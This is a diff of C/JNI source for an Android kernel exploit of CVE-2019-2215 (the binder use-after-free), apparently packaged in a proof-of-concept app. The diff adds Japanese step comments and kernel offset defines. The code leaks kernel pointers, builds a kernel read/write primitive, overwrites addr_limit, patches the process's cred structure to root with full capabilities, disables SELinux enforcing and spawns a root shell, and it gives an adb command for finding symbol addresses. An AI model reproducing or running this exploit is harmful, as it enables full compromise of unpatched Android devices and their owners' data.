@@ -17,41 +17,48 @@
 #include <sched.h>
 #include <signal.h>
 #include <pthread.h>
-#include <linux/types.h>
-#include <linux/binder.h>
+
+// カーネルヘッダの代わりに提供された binder.h を使用
+#include "binder.h"
 
 #define LOG_TAG "CVE-2019-2215"
 #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
 #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
 
+// BINDER_THREAD_EXIT は binder.h に定義済み
+// 念のため定義（定義済みなら重複しないようチェック）
+#ifndef BINDER_THREAD_EXIT
 #define BINDER_THREAD_EXIT _IOW('b', 8, __s32)
+#endif
+
 #define PAGE_SIZE 4096
 #define IOVEC_COUNT 25
 #define IOVEC_OVERLAP_INDEX 10
 
-// ARM64 offsets (adjust based on your kernel)
-#define TASK_STRUCT_PID_OFFSET 0x4E8
-#define TASK_STRUCT_CRED_OFFSET 0x688
-#define TASK_STRUCT_NSPROXY_OFFSET 0x6C0
+// ===== オフセット（要調整） =====
+// これらの値はターゲットカーネルに合わせて変更する必要があります
+// カーネル 4.4.19（ARM64）での一般的な値
+#define TASK_STRUCT_PID_OFFSET       0x4E8
+#define TASK_STRUCT_CRED_OFFSET      0x688
+#define TASK_STRUCT_NSPROXY_OFFSET   0x6C0
 #define TASK_STRUCT_ADDR_LIMIT_OFFSET 0xA18
-#define CRED_UID_OFFSET 0x4
-#define CRED_GID_OFFSET 0x8
-#define CRED_SUID_OFFSET 0xC
-#define CRED_SGID_OFFSET 0x10
-#define CRED_EUID_OFFSET 0x14
-#define CRED_EGID_OFFSET 0x18
-#define CRED_FSUID_OFFSET 0x1C
-#define CRED_FSGID_OFFSET 0x20
-#define PIPE_READ_KPTR_OFFSET 0xE8
+#define CRED_UID_OFFSET              0x4
+#define CRED_GID_OFFSET              0x8
+#define CRED_SUID_OFFSET             0xC
+#define CRED_SGID_OFFSET             0x10
+#define CRED_EUID_OFFSET             0x14
+#define CRED_EGID_OFFSET             0x18
+#define CRED_FSUID_OFFSET            0x1C
+#define CRED_FSGID_OFFSET            0x20
 
 #define GLOBAL_ROOT_UID 0
 #define GLOBAL_ROOT_GID 0
 #define CAP_FULL_SET 0x3FFFFFFFFF
 
-// Symbols from /proc/kallsyms - adjust for your device
-// These are example values for kernel 4.4.19
-#define SYMBOL_OFFSET_INIT_NSPROXY 0x1233ac0
+// シンボルアドレス（要調整）
+// adb shell cat /proc/kallsyms | grep -E "init_nsproxy|selinux_enforcing" で取得
+#define SYMBOL_OFFSET_INIT_NSPROXY      0x1233ac0
 #define SYMBOL_OFFSET_SELINUX_ENFORCING 0x14acfe8
 
 static int binder_fd;
@@ -84,6 +91,7 @@ void *mmap_page(unsigned long addr) {
     return mem;
 }
 
+// ----- Step 1: カーネルポインタのリーク -----
 int leak_task_struct(void) {
     int pipefd[2];
     char buffer[PAGE_SIZE] = {0};
@@ -199,6 +207,7 @@ int leak_task_struct(void) {
     return 0;
 }
 
+// ----- Step 2: カーネル読み書きプリミティブのセットアップ -----
 int setup_kernel_rw(void) {
     LOGI("[*] Setting up kernel read/write primitive...");
 
@@ -290,6 +299,7 @@ int trigger_uaf_for_rw(void) {
     return 0;
 }
 
+// ----- Step 3: addr_limit 書き換え -----
 int overwrite_addr_limit(void) {
     LOGI("[*] Overwriting addr_limit...");
 
@@ -298,7 +308,6 @@ int overwrite_addr_limit(void) {
 
     LOGI("[+] addr_limit @ 0x%llx", (unsigned long long)addr_limit_addr);
 
-    // Send the address to overwrite through the pipe
     if (write(krw_pipe[1], &addr_limit_addr, 8) != 8) {
         LOGE("Failed to write addr_limit address");
         return -1;
@@ -309,10 +318,11 @@ int overwrite_addr_limit(void) {
         return -1;
     }
 
-    LOGI("[+] addr_limit overwritten to 0x%llx", (unsigned long long)new_addr_limit);
+    LOGI("[+] addr_limit overwritten");
     return 0;
 }
 
+// ----- Step 4: cred ポインタ漏洩 -----
 int leak_cred_ptr(void) {
     LOGI("[*] Leaking cred pointer...");
 
@@ -332,6 +342,7 @@ int leak_cred_ptr(void) {
     return 0;
 }
 
+// ----- Step 5: cred 構造体を root に書き換え -----
 int patch_cred(void) {
     LOGI("[*] Patching cred structure to root...");
 
@@ -340,7 +351,7 @@ int patch_cred(void) {
     uint32_t root = 0;
     uint64_t cap_full = CAP_FULL_SET;
 
-    // Write UID fields (offset 0x4, 0xC, 0x14, 0x1C)
+    // UID: uid, suid, euid, fsuid
     uint64_t uid_addr = cred_base + CRED_UID_OFFSET;
     if (write(krw_pipe[1], &uid_addr, 8) != 8) return -1;
     if (write(krw_pipe[1], &root, 4) != 4) return -1;
@@ -357,7 +368,7 @@ int patch_cred(void) {
     if (write(krw_pipe[1], &fsuid_addr, 8) != 8) return -1;
     if (write(krw_pipe[1], &root, 4) != 4) return -1;
 
-    // Write GID fields (offset 0x8, 0x10, 0x18, 0x20)
+    // GID: gid, sgid, egid, fsgid
     uint64_t gid_addr = cred_base + CRED_GID_OFFSET;
     if (write(krw_pipe[1], &gid_addr, 8) != 8) return -1;
     if (write(krw_pipe[1], &root, 4) != 4) return -1;
@@ -374,17 +385,18 @@ int patch_cred(void) {
     if (write(krw_pipe[1], &fsgid_addr, 8) != 8) return -1;
     if (write(krw_pipe[1], &root, 4) != 4) return -1;
 
-    // Write capabilities (offset 0x28, 0x30, 0x38, 0x40, 0x48)
+    // Capabilities
     for (int i = 0; i < 5; i++) {
         uint64_t cap_addr = cred_base + 0x28 + (i * 8);
         if (write(krw_pipe[1], &cap_addr, 8) != 8) return -1;
         if (write(krw_pipe[1], &cap_full, 8) != 8) return -1;
     }
 
-    LOGI("[+] Cred patched to root (UID=0, GID=0, CAP_FULL_SET)");
+    LOGI("[+] Cred patched to root (UID=0, GID=0, CAP_FULL)");
     return 0;
 }
 
+// ----- Step 6: SELinux 無効化（任意） -----
 int disable_selinux(void) {
     LOGI("[*] Attempting to disable SELinux enforcing...");
 
@@ -407,6 +419,7 @@ int disable_selinux(void) {
     return 0;
 }
 
+// ----- Step 7: カーネルベース計算 -----
 int get_kernel_base(void) {
     LOGI("[*] Calculating kernel base...");
 
@@ -432,6 +445,7 @@ int get_kernel_base(void) {
     return 0;
 }
 
+// ----- Step 8: シェル起動 -----
 int spawn_root_shell(void) {
     LOGI("[*] Spawning root shell...");
 
@@ -452,7 +466,6 @@ int spawn_root_shell(void) {
     } else {
         LOGI("[+] Not root yet (UID=%d), attempting to fork shell...", getuid());
 
-        // Try to spawn a shell with setuid
         pid_t pid = fork();
         if (pid == 0) {
             setuid(0);
@@ -469,6 +482,7 @@ int spawn_root_shell(void) {
     }
 }
 
+// ----- JNI エントリポイント -----
 JNIEXPORT jint JNICALL
 Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215(JNIEnv* env, jclass clazz) {
     int ret;
@@ -525,7 +539,7 @@ Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215(JNIEnv* env, jclass
 
     spawn_root_shell();
 
-    LOGI("[+] Exploit completed successfully!");
+    LOGI("[+] Exploit completed!");
     LOGI("========================================");
 
     return 0;
